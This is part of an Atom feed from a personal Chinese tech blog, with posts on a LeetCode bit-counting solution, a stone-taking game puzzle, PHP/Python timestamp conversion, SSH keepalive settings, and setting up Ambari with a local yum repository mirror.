    <id>http://retanoj.github.io/2016/04/16/题目-2016-04-16-leetcode-338-Counting-Bits/</id>
    <published>2016-04-15T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="388-Counting-Bits"><a href="#388-Counting-Bits" class="headerlink" title="388.Counting Bits"></a>388.Counting Bits</h2><p>给出一个非零数字 num，对于每一个在 0 &lt;= i &lt;= num的i，输出 i 的二进制表示中数字1的个数。</p><p>例如 num = 5，应该输出 [0,1,1,2,1,2]。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>num = 5时</p><p>i = 0 – 0000， 1的个数为 res[0] = 0 个</p><p>i = 1 – 0001， 1的个数为 res[1] = 1 个</p><p>i = 2 – 0010， 1的个数为 res[2] = 1 个</p><p>i = 3 – 0011， 1的个数为 res[3] = 2 个</p><p>i = 4 – 0100， 1的个数为 res[4] = 1 个</p><p>i = 5 – 0101， 1的个数为 res[5] = 2 个</p><p>重点在于如何利用先前计算得到的结果来帮助计算当前 i 所对应的值。</p><p>当 i 是奇数（如5）时，末位’1’由 4 加一而来，因此res[5] = res[5 - 1] + 1，也可以用&amp;将末位置零，即res[5] = res[5 &amp; 4] + 1</p><p>当 i 是偶数（如4）时，末位’0’由 3 加一进位而来，即b’011’ -&gt; b’100’。同样，可以用&amp;将变化的bit位置零后，结果加一即可。 res[4] = res[4 &amp; 3] + 1</p><p>因此, res[i] = res[(i &amp; (i-1))] + 1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;388-Counting-Bits&quot;&gt;&lt;a href=&quot;#388-Counting-Bits&quot; class=&quot;headerlink&quot; title=&quot;388.Counting Bits&quot;&gt;&lt;/a&gt;388.Counting Bits&lt;/h2&gt;&lt;p&gt;给出一个非零数字 n
      
    
    </summary>
    
      <category term="算法" scheme="http://retanoj.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>腾讯2016在线笔试某题</title>
    <link href="http://retanoj.github.io/2016/03/03/%E9%A2%98%E7%9B%AE-2016-03-03-%E8%85%BE%E8%AE%AF2016%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AF%95%E6%9F%90%E9%A2%98/"/>
    <id>http://retanoj.github.io/2016/03/03/题目-2016-03-03-腾讯2016在线笔试某题/</id>
    <published>2016-03-02T16:00:00.000Z</published>
    <updated>2020-04-17T13:05:31.116Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>甲乙两人按一定规则拿棋子，棋子有19颗，规则是每次每人只能拿1或3或6颗。问是否有先手必胜策略，策略是什么？</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>首先说明一点，按个人理解题意，当剩下2颗棋子时，选手只能拿走1颗。</p><p>接下来说递推过程</p><ul><li><p>棋子有1颗，按如上规则，那么先手必胜，必胜策略是拿1颗；</p></li><li><p>棋子有2颗，按如上规则，那么先手必败，因为先手只能拿1颗，后手（对方）在剩余棋子情况下拿1颗，对方赢；</p></li><li><p>棋子有3颗，按如上规则，那么先手必胜，必胜策略是拿3颗；</p></li><li><p>棋子有4颗，……………………….先手必败，因为无论先手拿1颗还是3颗，后手（对方）都能一次拿完剩余的3颗或1颗（即，当先手拿完棋子后，在剩余棋子的情况下后手拥有“先拿”必胜策略）；</p></li><li><p>……</p></li></ul><p>可归纳出结论如下：在棋子有N颗的情况下，若先手通过拿1颗或3颗或6颗的规则能够将后手引入剩余棋子的“先拿”必败策略，则先手必胜；若先手在三种规则下都会将后手引入剩余棋子的“先拿”必胜策略，则先手必败。</p><p>因此可以列出下表</p><p><img src="/images/3dc4ad00jw1f2qdp6zltzj20hs02paam.jpg" alt></p><p>举例来看，当棋子有7颗时，先手拿1颗后手剩6颗，后手进入“先拿必胜棋子数6颗”的情况；先手拿3颗，后手进入“先拿必输棋子数4颗”的情况。因此在棋子数为7时，先手先拿3颗会必胜。</p><p>因此，19颗时，19-1=18（可行），19-3=16（不行），19-6=13（可行）。先手有两种必胜策略，先拿1颗或先拿6颗。</p><p>往后推也可以知道，这种算法的时间复杂度为O(n)</p><p>题解结束</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;甲乙两人按一定规则拿棋子，棋子有19颗，规则是每次每人只能拿1或3或6颗。问是否有先手必胜策略，策略是什么？&lt;/p&gt;
&lt;h2 id=&quot;题解&quot;
      
    
    </summary>
    
      <category term="算法" scheme="http://retanoj.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>网站返回时间问题</title>
    <link href="http://retanoj.github.io/2014/08/14/Misc-2014-08-14-%E7%BD%91%E7%AB%99%E8%BF%94%E5%9B%9E%E6%97%B6%E9%97%B4%E9%97%AE%E9%A2%98/"/>
    <id>http://retanoj.github.io/2014/08/14/Misc-2014-08-14-网站返回时间问题/</id>
    <published>2014-08-13T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GMT时间"><a href="#GMT时间" class="headerlink" title="GMT时间"></a>GMT时间</h2><pre><code>GMT(Greenwich Mean Time)是格林尼治平时在格林尼治子午线上的平太阳时称为世界时(UTC)，又叫格林尼治平时(GMT)。 </code></pre><h2 id="PHP时区设置"><a href="#PHP时区设置" class="headerlink" title="PHP时区设置"></a>PHP时区设置</h2><pre><code>在php.ini中，`date.timezone` 参数控制时区上海时间为GMT + 0800小时，即东八区一些常用的时区标识符说明：     Asia/Shanghai – 上海    Asia/Macao – 澳门     ...在程序PHP 5以上版本的程序代码中使用函数    ini_set(&apos;date.timezone&apos;,&apos;Asia/Shanghai&apos;); 或     date_default_timezone_set(‘Asia/Shanghai&apos;); 来设置时区</code></pre><h2 id="PHP-时间戳与日期转换"><a href="#PHP-时间戳与日期转换" class="headerlink" title="PHP 时间戳与日期转换"></a>PHP 时间戳与日期转换</h2><pre><code>返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数。    echo time();UNIX时间戳转换为日期函数: date()    echo date(&quot;Y-m-d H:i:s&quot;,time());日期转换为时间戳用函数: strtotime()    echo strtotime(&apos;2010-03-24 08:15:42&apos;);</code></pre><h2 id="Python-时间戳与日期转换"><a href="#Python-时间戳与日期转换" class="headerlink" title="Python 时间戳与日期转换"></a>Python 时间戳与日期转换</h2><pre><code>UNIX时间戳转换为日期函数: time.strftime()    import time    x = time.localtime(1317091800.0)    time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;, x)日期转换为时间戳用函数: datetime.datetime()    import time    import datetime    dc = datetime.datetime(2010, 6, 8, 19, 14, 59)    print time.mktime(dc.timetuple())</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GMT时间&quot;&gt;&lt;a href=&quot;#GMT时间&quot; class=&quot;headerlink&quot; title=&quot;GMT时间&quot;&gt;&lt;/a&gt;GMT时间&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;GMT(Greenwich Mean Time)是格林尼治平时
在格林尼治子午线上的平太阳时称为世界
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>保持SSH连接</title>
    <link href="http://retanoj.github.io/2014/08/13/Misc-2014-08-13-%E4%BF%9D%E6%8C%81SSH%E8%BF%9E%E6%8E%A5/"/>
    <id>http://retanoj.github.io/2014/08/13/Misc-2014-08-13-保持SSH连接/</id>
    <published>2014-08-12T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><pre><code>修改/etc/ssh/sshd_config  TCPKeepAlive yes  ClientAliveInterval 60  ClientAliveCountMax 5</code></pre><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><pre><code>ssh客户端全局修改/etc/ssh/ssh_config  TCPKeepAlive yes  ServerAliveInterval 60ssh客户端针对某次连接  ssh -o ServerAliveInterval=60 IPPuTTY客户端  在PuTTY Configuration中的Connection选项卡中  将Seconds between keepalives调成 10 （秒为单位）MyEnTunnel客户端  勾选Slow Poll（慢速轮询）选项</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;服务器端&quot;&gt;&lt;a href=&quot;#服务器端&quot; class=&quot;headerlink&quot; title=&quot;服务器端&quot;&gt;&lt;/a&gt;服务器端&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;修改/etc/ssh/sshd_config
  TCPKeepAlive yes
  ClientAliv
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>安装ambari(1.4.1.25)</title>
    <link href="http://retanoj.github.io/2014/03/27/%E4%BA%91%E8%AE%A1%E7%AE%97-2014-03-27-%E5%AE%89%E8%A3%85ambari-1-4-1-25/"/>
    <id>http://retanoj.github.io/2014/03/27/云计算-2014-03-27-安装ambari-1-4-1-25/</id>
    <published>2014-03-26T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.730Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h3><p>1.1 永久关闭iptables、selinux，开启htpd服务（或者后期配置iptables）</p><pre><code>iptables服务开机自启动： chkconfig iptables on开机不启动： chkconfig iptables off启动： service iptables start关闭： service iptables stopselinux永久关闭临时关闭： sudo setenforce 0修改 /etc/selinux/config 中 SELINUX=disabledntpd服务安装： yum install -y ntp开机自启动： chkconfig ntpd on启动： /etc/init.d/ntpd start</code></pre><p>1.2 集群识别</p><pre><code>方法一 —— 配置hosts文件xxx.xxx.xxx.xxx ambarixxx.xxx.xxx.xxx master.hadoop方法二 —— 配置DNS域名服务器 和 每台机器的FQDN</code></pre><p>1.3 集群免密登陆</p><pre><code>配置 ambari-server 与各个 ambari-agent 之间免密码登陆，并保存好ambari-server的私钥备用参考 1.设置sudo免密码登陆http://www.cnblogs.com/maybob/p/3298846.html2.设置SSH无密码登陆远程主机http://www.cnblogs.com/maybob/p/3298903.html</code></pre><p>1.4 集群时间同步</p><pre><code>参考 http://www.cnblogs.com/maybob/p/3332003.html</code></pre><h2 id="2-安装与配置ambari服务"><a href="#2-安装与配置ambari服务" class="headerlink" title="2. 安装与配置ambari服务"></a>2. 安装与配置ambari服务</h2><p>2.1 配置ambari本地源</p><pre><code>vim /etc/yum.repos.d/ambari.repo添加以下内容&apos;&apos;&apos;[ambari-1.x]name=Ambari 1.xbaseurl=http://源IP/ambari/gpgcheck=0enabled=1[HDP-UTILS-1.1.0.16]name=Hortonworks Data Platform Utils Version - HDP-UTILS-1.1.0.16baseurl=http://源IP/ambari/gpgcheck=0enabled=1[Updates-ambari-1.4.1.25]name=ambari-1.4.1.25 - Updatesbaseurl=http://源IP/ambari/gpgcheck=enabled=1&apos;&apos;&apos;vim /etc/yum.repos.d/centos.repo添加以下内容&apos;&apos;&apos;[centos]baseurl=http://源IP/centos/enabled=1gpgcheck=0&apos;&apos;&apos;</code></pre><p>2.2 开始安装</p><pre><code>yum -y install ambari-server</code></pre><p>2.3 开始配置ambari服务</p><pre><code>将之前准备的 jdk-6u31-linux-x64.bin 上传到 /var/lib/ambari-server/resourceschmod +x jdk-6u31-linux-x64.binambari-server setup #安装过程中保持默认就好</code></pre><h2 id="3-为ambari配置hadoop本地源"><a href="#3-为ambari配置hadoop本地源" class="headerlink" title="3. 为ambari配置hadoop本地源"></a>3. 为ambari配置hadoop本地源</h2><pre><code>cd /var/lib/ambari-server/resources/stacks/HDPLocal/2.0.6/repos/vim repoinfo.xml 修改对应系统版本(centos 6)的 &lt;baseurl&gt;&lt;reposinfo&gt;  &lt;os type=&quot;centos6&quot;&gt;    &lt;repo&gt;      &lt;baseurl&gt;http://源IP/hdp/&lt;/baseurl&gt;      &lt;repoid&gt;HDP-2.0.6&lt;/repoid&gt;      &lt;reponame&gt;HDP&lt;/reponame&gt;    &lt;/repo&gt;  &lt;/os&gt;</code></pre><p>到此，ambari安装完成。在接下来的环境部署过程中，ambari为所有主机安装ambari-agent时，会将ambari server下的 /etc/yum.repo.d/ambari.repo 文件复制到所有主机。在安装hadoop环境时，会将3中设置的本地源配置到所有主机</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-前期准备&quot;&gt;&lt;a href=&quot;#1-前期准备&quot; class=&quot;headerlink&quot; title=&quot;1. 前期准备&quot;&gt;&lt;/a&gt;1. 前期准备&lt;/h3&gt;&lt;p&gt;1.1 永久关闭iptables、selinux，开启htpd服务（或者后期配置iptables）&lt;/p
      
    
    </summary>
    
      <category term="云计算" scheme="http://retanoj.github.io/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    
      <category term="云计算" scheme="http://retanoj.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="ambari" scheme="http://retanoj.github.io/tags/ambari/"/>
    
  </entry>
  
  <entry>
    <title>搭建本地ambari yum源</title>
    <link href="http://retanoj.github.io/2014/03/26/%E4%BA%91%E8%AE%A1%E7%AE%97-2014-03-26-%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ambari-yum%E6%BA%90/"/>
    <id>http://retanoj.github.io/2014/03/26/云计算-2014-03-26-搭建本地ambari-yum源/</id>
    <published>2014-03-25T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-一台联网机器，下载所需文件"><a href="#1-一台联网机器，下载所需文件" class="headerlink" title="1. 一台联网机器，下载所需文件"></a>1. 一台联网机器，下载所需文件</h2><p>1.1 准备ambari.repo相关组件</p><pre><code>wget http://public-repo-1.hortonworks.com/ambari/centos6/1.x/updates/1.4.1.25/ambari.repocp ambari.repo /etc/yum.repos.d/同步如下安装包 (ps,会直接同步到当前目录下)reposync -r HDP-UTILS-1.1.0.16reposync -r Updates-ambari-1.4.1.25reposync -r ambari-1.x</code></pre><p>1.2.1 准备hortonworks hadoop (HDP) 2.0.6本地源 ——方法一</p><pre><code>vim /etc/yum.repos.d/HDP.repo添加如下内容&apos;&apos;&apos;[HDP-2.0.6]name=HDPbaseurl=http://public-repo-1.hortonworks.com/HDP/centos6/2.x/updates/2.0.6.0enabled=1gpgcheck=0&apos;&apos;&apos;同步HDP-2.0.6到本地（约3G大小）reposync -r HDP-2.0.6</code></pre><p>1.2.2 准备hortonworks hadoop (HDP) 2.0.6本地源 ——方法二</p><pre><code>下载HDP-2.0.6即可http://s3.amazonaws.com/public-repo-1.hortonworks.com/HDP/centos6/HDP-2.0.6.0-centos6-rpm.tar.gz</code></pre><p>1.3 下载或准备Centos 6系统</p><pre><code>如北理源    http://mirror.bit.edu.cn/centos/6/os/x86_64/</code></pre><p>1.4 下载好 <strong>jdk-6u31-linux-x64.bin</strong> 备用 </p><h2 id="2-搭建本地yum源环境"><a href="#2-搭建本地yum源环境" class="headerlink" title="2. 搭建本地yum源环境"></a>2. 搭建本地yum源环境</h2><p>2.1 制作ambari源相关组件源</p><pre><code>需要一台较大硬盘的web服务器，可被即将安装ambari的机器访问到将 HDP-UTILS-1.1.0.16 、 Updates-ambari-1.4.1.25 、 ambari-1.x 复制到 /var/www/html/ambari文件夹下执行如下命令cd /var/www/html/ambaricreaterepo ./ (ps, createrepo 可能需要安装)</code></pre><p>2.2 制作HDP-2.0.6软件源</p><pre><code>将之前下载或同步的HDP-2.0.6 (如果是.tar.gz文件需要解压) 复制到 /var/www/html/hdp文件夹下执行如下命令cd /var/www/html/hdpcreaterepo ./</code></pre><p>2.3 制作Centos 6安装源</p><pre><code>将之前准备的centos 6安装环境复制到 /var/www/html/centos/ 文件夹下 (ps, 如需解压请解压)</code></pre><h2 id="3-测试源是否成功"><a href="#3-测试源是否成功" class="headerlink" title="3. 测试源是否成功"></a>3. 测试源是否成功</h2><pre><code>访问 http://本机ip/ambari 、 http://本机ip/hdp 和 http://本机ip/centos 能够正常访问即可    </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-一台联网机器，下载所需文件&quot;&gt;&lt;a href=&quot;#1-一台联网机器，下载所需文件&quot; class=&quot;headerlink&quot; title=&quot;1. 一台联网机器，下载所需文件&quot;&gt;&lt;/a&gt;1. 一台联网机器，下载所需文件&lt;/h2&gt;&lt;p&gt;1.1 准备ambari.rep
      
    
    </summary>
    
      <category term="云计算" scheme="http://retanoj.github.io/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    
      <category term="云计算" scheme="http://retanoj.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="ambari" scheme="http://retanoj.github.io/tags/ambari/"/>
    
  </entry>
  
</feed>
